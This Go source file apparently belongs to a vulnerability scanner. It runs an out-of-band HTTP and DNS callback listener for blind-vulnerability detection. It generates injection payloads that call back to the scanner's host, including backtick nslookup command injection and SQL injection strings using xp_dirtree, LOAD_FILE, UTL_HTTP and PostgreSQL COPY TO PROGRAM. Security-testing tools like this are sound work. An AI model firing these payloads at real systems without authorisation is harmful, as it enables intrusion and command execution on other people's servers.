package oob

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// Server provides an embedded OOB (Out-of-Band) callback listener for
// detecting blind vulnerabilities. It listens on HTTP and DNS and records
// any incoming interactions that match a scan-generated token.
type Server struct {
	mu          sync.RWMutex
	token       string              // per-scan unique token
	interactions map[string]*Interaction

	httpPort    int
	httpServer  *http.Server

	dnsPort     int
	dnsServer   *dnsServer
}

// Interaction records a single OOB callback event.
type Interaction struct {
	Token      string
	Protocol   string // "http", "dns", "smtp"
	RemoteAddr string
	Request    string
	Response   string
	Timestamp  time.Time
	Payload    string // injected payload that triggered this callback
	VulnType   string // "ssrf", "xxe", "sqli", "cmdi", "lfi"
}

// NewServer creates an OOB server with a random scan token.
func NewServer(httpPort, dnsPort int) *Server {
	token := generateToken(12)
	return &Server{
		token:        token,
		interactions: make(map[string]*Interaction),
		httpPort:     httpPort,
		dnsPort:      dnsPort,
	}
}

// GenerateOOBPayload creates a payload embedding the scan token that, if
// triggered by a vulnerable server, will call back to our listener.
func (s *Server) GenerateOOBPayload(vulnType, host string, port int) string {
	interactionID := generateToken(8)
	switch vulnType {
	case "ssrf":
		return fmt.Sprintf("http://%s.%s.%s:%d/%s", interactionID, s.token, host, port, interactionID)
	case "xxe":
		return fmt.Sprintf("http://%s.%s.%s:%d/%s", interactionID, s.token, host, port, interactionID)
	case "sqli":
		// UNC path for SQL Server xp_dirtree / xp_fileexist
		return fmt.Sprintf("\\\\\\\\%s.%s.%s@%d\\\\%s", interactionID, s.token, host, port, interactionID)
	case "cmdi":
		return fmt.Sprintf("`nslookup %s.%s.%s`", interactionID, s.token, host)
	case "lfi":
		// PHP expect:// wrapper or RFI
		return fmt.Sprintf("http://%s.%s.%s:%d/%s", interactionID, s.token, host, port, interactionID)
	default:
		return fmt.Sprintf("%s.%s.%s", interactionID, s.token, host)
	}
}

// PredictBlindSQLiPayload generates OOB SQLi payloads for various DB engines.
func (s *Server) PredictBlindSQLiPayload(db string, host string, port int) string {
	id := generateToken(6)
	switch strings.ToLower(db) {
	case "mysql":
		return fmt.Sprintf("' OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\%s.%s.%s@%d\\\\%s')))--",
			id, s.token, host, port, id)
	case "mssql":
		return fmt.Sprintf("'; EXEC xp_dirtree '\\\\\\\\%s.%s.%s@%d\\\\%s'--",
			id, s.token, host, port, id)
	case "oracle":
		return fmt.Sprintf("' OR UTL_HTTP.REQUEST('http://%s.%s.%s:%d/%s')--",
			id, s.token, host, port, id)
	case "postgresql":
		return fmt.Sprintf("'; COPY (SELECT '') TO PROGRAM 'nslookup %s.%s.%s'--",
			id, s.token, host)
	default:
		return fmt.Sprintf("' OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\%s.%s.%s@%d\\\\%s')))--",
			id, s.token, host, port, id)
	}
}

// Start launches the HTTP and DNS listeners.
func (s *Server) Start() error {
	var wg sync.WaitGroup
	var errs []error
	var errMu sync.Mutex

	// HTTP listener
	wg.Add(1)
	go func() {
		defer wg.Done()
		mux := http.NewServeMux()
		mux.HandleFunc("/", s.httpHandler)
		s.httpServer = &http.Server{
			Addr:    fmt.Sprintf(":%d", s.httpPort),
			Handler: mux,
		}
		fmt.Printf("  \033[36m[OOB] HTTP listener on :%d (token=%s)\033[0m\n", s.httpPort, s.token)
		if err := s.httpServer.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			errMu.Lock()
			errs = append(errs, fmt.Errorf("HTTP OOB: %w", err))
			errMu.Unlock()
		}
	}()

	// DNS listener
	if s.dnsPort > 0 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			s.dnsServer = &dnsServer{token: s.token, interactions: &s.interactions, mu: &s.mu}
			fmt.Printf("  \033[36m[OOB] DNS listener on :%d (token=%s)\033[0m\n", s.dnsPort, s.token)
			if err := s.dnsServer.listen(s.dnsPort); err != nil {
				errMu.Lock()
				errs = append(errs, fmt.Errorf("DNS OOB: %w", err))
				errMu.Unlock()
			}
		}()
	}

	wg.Wait()
	if len(errs) > 0 {
		return errs[0]
	}
	return nil
}

// Stop gracefully shuts down the OOB server.
func (s *Server) Stop() {
	if s.httpServer != nil {
		s.httpServer.Close()
	}
	if s.dnsServer != nil {
		s.dnsServer.close()
	}
}

// httpHandler processes incoming HTTP callbacks.
func (s *Server) httpHandler(w http.ResponseWriter, r *http.Request) {
	// Extract the interaction ID from the Host header or URL path
	host := r.Host
	path := r.URL.Path

	if !strings.Contains(host, s.token) && !strings.Contains(path, s.token) {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	interaction := &Interaction{
		Token:      s.token,
		Protocol:   "http",
		RemoteAddr: r.RemoteAddr,
		Request:    fmt.Sprintf("%s %s %s\n%s", r.Method, r.URL.String(), r.Proto, flattenHTTPHeaders(r.Header)),
		Timestamp:  time.Now(),
	}

	// Try to determine the vulnerability type from the path
	switch {
	case strings.Contains(path, "ssrf"):
		interaction.VulnType = "SSRF"
	case strings.Contains(path, "xxe"):
		interaction.VulnType = "XXE"
	case strings.Contains(path, "sqli"):
		interaction.VulnType = "SQL Injection"
	case strings.Contains(path, "cmdi"):
		interaction.VulnType = "Command Injection"
	}

	key := fmt.Sprintf("http-%s-%d", host, time.Now().UnixNano())
	s.mu.Lock()
	s.interactions[key] = interaction
	s.mu.Unlock()

	fmt.Printf("  \033[31m[✗ OOB-HIT]\033[0m HTTP callback from %s (%s)\n", r.RemoteAddr, interaction.VulnType)

	// Respond with a simple page
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("OK"))
}

// Collect returns all interactions received so far.
func (s *Server) Collect() []*Interaction {
	s.mu.RLock()
	defer s.mu.RUnlock()
	var result []*Interaction
	for _, v := range s.interactions {
		result = append(result, v)
	}
	return result
}

// HasInteractions returns true if any callback was received.
func (s *Server) HasInteractions() bool {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return len(s.interactions) > 0
}

// ── DNS Server ────────────────────────────────────────────────────────────

type dnsServer struct {
	token        string
	interactions *map[string]*Interaction
	mu           *sync.RWMutex
	conn         *net.UDPConn
}

func (ds *dnsServer) listen(port int) error {
	addr := &net.UDPAddr{Port: port}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return err
	}
	ds.conn = conn

	buf := make([]byte, 512)
	for {
		n, remote, err := conn.ReadFromUDP(buf)
		if err != nil {
			if strings.Contains(err.Error(), "use of closed network connection") {
				return nil
			}
			continue
		}
		ds.processQuery(buf[:n], remote)
	}
}

func (ds *dnsServer) processQuery(data []byte, remote *net.UDPAddr) {
	// Minimal DNS query parser — extract the queried domain name
	if len(data) < 12 {
		return
	}
	// Skip header (12 bytes), parse question section
	domain := extractDNSQuestion(data[12:])

	if !strings.Contains(domain, ds.token) {
		return // not our token
	}

	interaction := &Interaction{
		Token:      ds.token,
		Protocol:   "dns",
		RemoteAddr: remote.String(),
		Request:    fmt.Sprintf("DNS query for %s", domain),
		Timestamp:  time.Now(),
	}

	// Determine vuln type from subdomain
	lower := strings.ToLower(domain)
	switch {
	case strings.Contains(lower, "ssrf"):
		interaction.VulnType = "SSRF (Blind)"
	case strings.Contains(lower, "xxe"):
		interaction.VulnType = "XXE (Blind)"
	case strings.Contains(lower, "sqli"):
		interaction.VulnType = "SQL Injection (Blind)"
	case strings.Contains(lower, "cmdi"):
		interaction.VulnType = "Command Injection (Blind)"
	case strings.Contains(lower, "lfi"):
		interaction.VulnType = "LFI (Blind)"
	default:
		interaction.VulnType = "Unknown Blind"
	}

	key := fmt.Sprintf("dns-%s-%d", domain, time.Now().UnixNano())
	ds.mu.Lock()
	(*ds.interactions)[key] = interaction
	ds.mu.Unlock()

	fmt.Printf("  \033[31m[✗ OOB-HIT]\033[0m DNS query from %s for %s (%s)\n",
		remote.String(), domain, interaction.VulnType)

	// Send a minimal DNS response (A record pointing to ourselves)
	resp := buildDNSResponse(data)
	if resp != nil && ds.conn != nil {
		ds.conn.WriteToUDP(resp, remote) //nolint:errcheck
	}
}

func (ds *dnsServer) close() {
	if ds.conn != nil {
		ds.conn.Close()
	}
}

func extractDNSQuestion(data []byte) string {
	if len(data) < 1 {
		return ""
	}
	var parts []string
	pos := 0
	for pos < len(data) && data[pos] != 0 {
		length := int(data[pos])
		pos++
		if pos+length > len(data) {
			break
		}
		parts = append(parts, string(data[pos:pos+length]))
		pos += length
	}
	return strings.Join(parts, ".")
}

func buildDNSResponse(query []byte) []byte {
	if len(query) < 12 {
		return nil
	}
	resp := make([]byte, len(query)+16)
	copy(resp, query)
	// Set QR bit (response), RA (recursion available)
	resp[2] |= 0x80
	resp[3] |= 0x80
	// Answer count = 1
	resp[7] = 1
	// Append a simple A record answer (points to 127.0.0.1)
	offset := len(query)
	// Name pointer to question
	resp[offset] = 0xc0
	resp[offset+1] = 0x0c
	resp[offset+2] = 0x00
	resp[offset+3] = 0x01 // Type A
	resp[offset+4] = 0x00
	resp[offset+5] = 0x01 // Class IN
	resp[offset+6] = 0x00
	resp[offset+7] = 0x00
	resp[offset+8] = 0x00
	resp[offset+9] = 0x3c // TTL 60
	resp[offset+10] = 0x00
	resp[offset+11] = 0x04 // Data length 4
	resp[offset+12] = 127
	resp[offset+13] = 0
	resp[offset+14] = 0
	resp[offset+15] = 1
	return resp
}

// ── Utilities ─────────────────────────────────────────────────────────────

func generateToken(n int) string {
	b := make([]byte, n)
	rand.Read(b) //nolint:errcheck
	return hex.EncodeToString(b)[:12]
}

func flattenHTTPHeaders(h http.Header) string {
	var sb strings.Builder
	for k, vals := range h {
		for _, v := range vals {
			sb.WriteString(k)
			sb.WriteString(": ")
			sb.WriteString(v)
			sb.WriteString("\n")
		}
	}
	return sb.String()
}

// Token returns the scan token used for callback identification.
func (s *Server) Token() string { return s.token }
